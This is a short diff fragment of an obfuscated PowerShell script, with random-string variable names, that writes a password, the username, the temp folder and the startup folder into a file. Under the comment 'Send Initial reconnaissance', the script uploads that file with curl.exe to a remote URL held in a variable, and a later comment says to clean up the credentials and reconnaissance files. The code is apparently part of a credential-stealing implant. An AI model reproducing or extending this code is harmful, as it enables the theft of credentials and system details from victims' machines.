@@ -45,10 +45,8 @@ Add-Content -Path $rtsRfiZBxpGP -Value $OIRXhsDHFU          #pass
 Add-Content -Path $rtsRfiZBxpGP -Value $env:USERNAME        #username
 Add-Content -Path $rtsRfiZBxpGP -Value $env:temp            #temp dir
 Add-Content -Path $rtsRfiZBxpGP -Value $fXmtFxsAMdGw        #startup dir
+
 # Send Initial reconnaissance
-$form_data = @{}
-$form_data["content"] = $env:USERNAME
-$form_data["file"] = Get-Item -Path $rtsRfiZBxpGP
 curl.exe -F "content=$env:USERNAME" -F "file=@$rtsRfiZBxpGP" $QLxOhYDbSkv
 
 # cleanup your credentials and reconnaissance files
